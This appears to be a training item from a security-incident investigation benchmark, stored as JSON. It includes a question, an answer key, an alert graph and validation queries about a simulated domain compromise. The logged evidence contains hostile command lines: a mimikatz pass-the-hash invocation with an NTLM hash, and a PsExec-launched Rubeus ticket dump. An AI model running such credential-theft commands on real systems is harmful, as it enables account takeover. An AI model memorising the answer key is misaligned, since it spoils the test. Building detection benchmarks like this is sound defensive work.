@@ -1,0 +1,941 @@
+{
+  "id": "incident_39_train_062",
+  "source_file": "data/excytin-bench/huggingface/questions/train/incident_39_qa_incident_o1-ga_c42.json",
+  "index": 62,
+  "sha256": "51898e3bff27d9ff8efd0c5a129f65cf6eafc3ba35e09b27c5013e938f76b79b",
+  "split": "train",
+  "question_record": {
+    "context": "During a security incident detected on 2024-07-04, a malicious credential theft tool named `mimikatz.exe` was executed with the command line indicating intent to dump users' credentials, keys, and plain-text passwords. This was a high-risk activity given its potential impact on accessing sensitive information.",
+    "question": "What was the process command line used during the observed activity indicating the use of the Rubeus kerberoasting tool?",
+    "answer": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+    "solution": [
+      "A known credential theft tool was executed on host `vnevado-win10v`.",
+      "The Rubeus tool was used via process with ID `5924` at `2024-06-27T14:33:14.4981439Z` with the command line `psexec.exe \\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"`."
+    ],
+    "start_alert": 44,
+    "end_alert": 107,
+    "start_entities": [
+      31,
+      38,
+      45
+    ],
+    "end_entities": [
+      97
+    ],
+    "shortest_alert_path": [
+      44,
+      32,
+      107
+    ]
+  },
+  "graph_file": "data/excytin-bench/github/secgym/qagen/graph_files/incident_39.graphml",
+  "graph_sha256": "018dbb36a3bc8e4e9df16f3337868296c9796087303c2321abc4a2eda2b79d41",
+  "path": [
+    "44",
+    "32",
+    "107"
+  ],
+  "nodes": {
+    "31": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ExtractedFileName",
+      "value": "mimikatz.exe"
+    },
+    "38": {
+      "type": "entity",
+      "node_type": "file",
+      "identifier_fields": "Name",
+      "value": "get-krbticket.ps1"
+    },
+    "45": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+    },
+    "44": {
+      "type": "alert",
+      "name": "Malicious credential theft tool execution detected",
+      "description": "A known credential theft tool execution command line was detected.\nEither the process itself or its command line indicated an intent to dump users' credentials, keys, plain-text passwords and more."
+    },
+    "32": {
+      "type": "entity",
+      "node_type": "host",
+      "identifier_fields": "HostName",
+      "value": "vnevado-win10v"
+    },
+    "107": {
+      "type": "alert",
+      "name": "Possible use of the Rubeus kerberoasting tool",
+      "description": "Activity indicating the use of the Rubeus tool was observed on this endpoint. This tool can perform kerberoasting, pass-the-ticket, and other attack techniques that take advantage of Kerberos authentication.\n\nDuring these attacks, attackers often request Kerberos tickets for an account's service principal name (SPN). They then decrypt the tickets to get plaintext credentials associated with the account. Alternatively, they can perform the pass-the-ticket technique to authenticate directly without having to decrypt the obtained tickets."
+    },
+    "97": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\""
+    }
+  },
+  "interpretation": {
+    "alerts": 2,
+    "sql_steps_per_variant": 2,
+    "start_alternatives": [
+      {
+        "node": "31",
+        "concept": "Command_File_Mention",
+        "value_literal_in_input": true,
+        "value_casefold_in_input": true
+      },
+      {
+        "node": "38",
+        "concept": "File_Name",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      },
+      {
+        "node": "45",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      }
+    ],
+    "target_concept": "Process_Identity",
+    "weak_links": [
+      "32"
+    ],
+    "scope": "official graph witness, not a proof of causality, actor identity or autonomous planning"
+  },
+  "merged_pm": "pm_3bf41bdce5e470f6",
+  "merged_ems": [
+    "em_546045b7ece99c80",
+    "em_d1102041c654bb01",
+    "em_bab3dcef4b9e19c5",
+    "em_7eb864af9d22aeb3"
+  ],
+  "offline_validation": [
+    {
+      "variant": "from_Command_File_Mention",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 7,
+          "expected_node": "32",
+          "expected_present": true,
+          "values": [
+            "vnevado-win10v"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb",
+              "time": "2024-07-04 22:35:00.671776+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "a2604763-f21a-3d7c-3683-4a9e082d7664",
+              "time": "2024-07-04 22:35:00.823035+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 15,
+              "entity_ref": "17",
+              "roles": [],
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-04 22:35:01.182306+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "532a5162-7573-5642-fd2a-baddc2ed1360",
+              "time": "2024-07-04 22:35:02.584465+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "80e1ce36-0e85-8e96-374b-706b848a201b",
+              "time": "2024-07-04 22:35:02.863113+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "486b0923-0456-2841-3dd4-5b3d0f0d0dc9",
+              "time": "2024-07-04 22:35:03.557275+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 13,
+              "entity_ref": "15",
+              "roles": [],
+              "alert_id": "1fc0b386-f173-5013-b555-c128b2532e97",
+              "time": "2024-07-04 22:35:04.214786+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "97",
+          "expected_present": true,
+          "values": [
+            "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+            "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1",
+              "raw_components": {
+                "ProcessId": "6636",
+                "CreatedTimeUtc": "2024-06-27T14:32:46.5860644Z",
+                "CommandLine": "powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-04 22:35:04.021732+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\""
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-04 22:35:04.021732+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "variant": "from_File_Name",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "32",
+          "expected_present": true,
+          "values": [
+            "vnevado-win10v"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 15,
+              "entity_ref": "17",
+              "roles": [],
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-04 22:35:01.182306+00:00",
+              "matched_inputs": [
+                "get-krbticket.ps1"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "97",
+          "expected_present": true,
+          "values": [
+            "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+            "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1",
+              "raw_components": {
+                "ProcessId": "6636",
+                "CreatedTimeUtc": "2024-06-27T14:32:46.5860644Z",
+                "CommandLine": "powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-04 22:35:04.021732+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\""
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-04 22:35:04.021732+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "variant": "from_Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "32",
+          "expected_present": true,
+          "values": [
+            "vnevado-win10v"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "entity_index": 15,
+              "entity_ref": "17",
+              "roles": [],
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-04 22:35:01.182306+00:00",
+              "matched_inputs": [
+                "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "97",
+          "expected_present": true,
+          "values": [
+            "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+            "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1",
+              "raw_components": {
+                "ProcessId": "6636",
+                "CreatedTimeUtc": "2024-06-27T14:32:46.5860644Z",
+                "CommandLine": "powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-04 22:35:04.021732+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\""
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-04 22:35:04.021732+00:00",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "live_validation": [
+    {
+      "variant": "route_382b44db51dbe441",
+      "seed_concept": "Command_File_Mention",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_7eb864af9d22aeb3",
+          "status": "ok",
+          "candidate_count": 189,
+          "unique_values": [
+            "vnevado-win10v"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-31 12:19:34.205582+00:00",
+              "source_row_hash": "0f116ac8edc1a28ea30bc7dd43246ff27e504c8ecade82e1e21e72add226bda1",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-21 22:34:52.714071+00:00",
+              "source_row_hash": "16ed885236c3561b3373c05721393899cd9ea29f56e1b66276671083ccbfb8d6",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-20 22:39:29.272087+00:00",
+              "source_row_hash": "24658850e333f4661fae0915d507f2b3337a2ad28667e1054b9503b8b5c3b6aa",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Command_File_Mention' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Malicious credential theft tool execution detected",
+            "mimikatz.exe"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_546045b7ece99c80",
+          "status": "ok",
+          "candidate_count": 54,
+          "unique_values": [
+            "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+            "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-27 22:35:10.766423+00:00",
+              "source_row_hash": "05d062928c99855b4204bbb0545ed142f3252486c83129dc0d667789257f8de1",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-05 22:34:21.233036+00:00",
+              "source_row_hash": "0e95e0392cf2a072835a1a919a404d13979751953ea78b167d2490dcf0739b3d",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-14 22:39:35.610006+00:00",
+              "source_row_hash": "20a9170559797ac3d4658e916a0921ad8f11eba201f3364b0aa299e0f7b89de2",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Possible use of the Rubeus kerberoasting tool",
+            "vnevado-win10v"
+          ],
+          "error": null
+        }
+      ]
+    },
+    {
+      "variant": "route_382b44db51dbe441",
+      "seed_concept": "File_Name",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_bab3dcef4b9e19c5",
+          "status": "ok",
+          "candidate_count": 27,
+          "unique_values": [
+            "vnevado-win10v"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-31 12:19:34.205582+00:00",
+              "source_row_hash": "0f116ac8edc1a28ea30bc7dd43246ff27e504c8ecade82e1e21e72add226bda1",
+              "matched_inputs": [
+                "get-krbticket.ps1"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-21 22:34:52.714071+00:00",
+              "source_row_hash": "16ed885236c3561b3373c05721393899cd9ea29f56e1b66276671083ccbfb8d6",
+              "matched_inputs": [
+                "get-krbticket.ps1"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-20 22:39:29.272087+00:00",
+              "source_row_hash": "24658850e333f4661fae0915d507f2b3337a2ad28667e1054b9503b8b5c3b6aa",
+              "matched_inputs": [
+                "get-krbticket.ps1"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'File_Name' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Malicious credential theft tool execution detected",
+            "get-krbticket.ps1"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_546045b7ece99c80",
+          "status": "ok",
+          "candidate_count": 54,
+          "unique_values": [
+            "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+            "6636__2024-06-27t14:32:46.5860644z__powershell.exe c:\\m365dattack\\get-krbticket.ps1"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-27 22:35:10.766423+00:00",
+              "source_row_hash": "05d062928c99855b4204bbb0545ed142f3252486c83129dc0d667789257f8de1",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-05 22:34:21.233036+00:00",
+              "source_row_hash": "0e95e0392cf2a072835a1a919a404d13979751953ea78b167d2490dcf0739b3d",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5924__2024-06-27t14:33:14.4981439z__\"psexec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"c:\\temp\\rubeus.exe dump /service:xfbzkp /user:lucasb > c:\\temp\\adminticket.txt\"",
+              "raw_components": {
+                "ProcessId": "5924",
+                "CommandLine": "\"PsExec.exe\" \\\\vnevado-win10b -accepteula cmd /c \"C:\\Temp\\Rubeus.exe dump /service:xfbzkp /user:lucasb > C:\\Temp\\AdminTicket.txt\"",
+                "CreatedTimeUtc": "2024-06-27T14:33:14.4981439Z"
+              },
+              "roles": [],
+              "entity_index": 11,
+              "alert_id": "225167be-a6e4-1ce5-fdc5-5ae46bddb15e",
+              "time": "2024-07-14 22:39:35.610006+00:00",
+              "source_row_hash": "20a9170559797ac3d4658e916a0921ad8f11eba201f3364b0aa299e0f7b89de2",
+              "matched_inputs": [
+                "vnevado-win10v"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Possible use of the Rubeus kerberoasting tool",
+            "vnevado-win10v"
+          ],
+          "error": null
+        }
+      ]
+    },
+    {
+      "variant": "route_382b44db51dbe441",
+      "seed_concept": "Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_d1102041c654bb01",
+          "status": "ok",
+          "candidate_count": 27,
+          "unique_values": [
+            "vnevado-win10v"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win10v",
+              "raw_components": {
+                "HostName": "vnevado-win10v"
+              },
+              "roles": [],
+              "entity_index": 15,
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-31 12:19:34.205582+00:00",
+              "source_row_hash": "0f116ac8edc1a28ea30bc7dd43246ff27e504c8ecade82e1e21e72add226bda1",
+              "matched_inputs": [
